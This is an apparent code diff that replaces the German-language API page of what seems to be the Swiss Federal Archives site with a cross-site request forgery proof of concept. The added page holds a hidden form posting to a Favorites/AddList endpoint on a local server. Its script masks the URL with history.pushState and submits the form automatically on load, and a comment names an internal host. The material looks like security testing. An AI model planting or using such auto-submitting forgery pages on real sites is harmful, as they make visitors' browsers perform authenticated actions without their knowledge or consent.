@@ -5,38 +5,17 @@
 
 </head>
 <body>
-    <div class="container container-main" >
-    <!--content-begins-->
-    <!--
-    Formate bei Code samples muss beibehalten werden. (pre Tags)
-    dafür in Visual Studio die Option "Tools/Options/Text Editor/HTML/Advanded/Format on Paste = false"
-    -->
-        <div id="content-wrapper">
-            <div class="container-fluid hidden-xs">
-                <div class="row">
-                    <div class="col-sm-12">
-                        <div class="mod mod-breadcrumb">
-                            <h2 id="br1" class="hidden">Breadcrumb</h2>
-                            <ol class="breadcrumb" aria-labelledby="br1">
-                                <li><a href="/en/" title="Schweizerisches Bundesarchiv"><i class="glyphicon glyphicon-home"></i></a><span class="icon icon--greater"></span></li>
-                                <li class="active" aria-selected="true" aria-label="current page">API</li>
-                            </ol>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="container-fluid">
-                <div class="row">
-                    <div class="col-sm-12 col-md-12 main-column" id="content" role="main">
-                        <div class="row">
-                            <div class="col-md-8 main-content">
-                                <span>Keine API vorhanden.</span>
-                            </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <!--content-end-->
-    </div>
+<div id="content-wrapper">
+    <!--  https://evelix-w04:44336/api/Favorites/AddList?listName=Klaus&nonce=1706543760123 -->
+    <form action="https://localhost:44336/api/Favorites/AddList?listName=addedByCsrf" method="POST" enctype="text/plain">
+        <input type="hidden" name="&#123;&#125;" value="" />
+        <input type="submit" value="Submit request" />
+    </form>
+</div>
+<script>
+            history.pushState('', '', '/');
+            document.forms[0].submit();
+    </script>
+
 </body>
 </html>
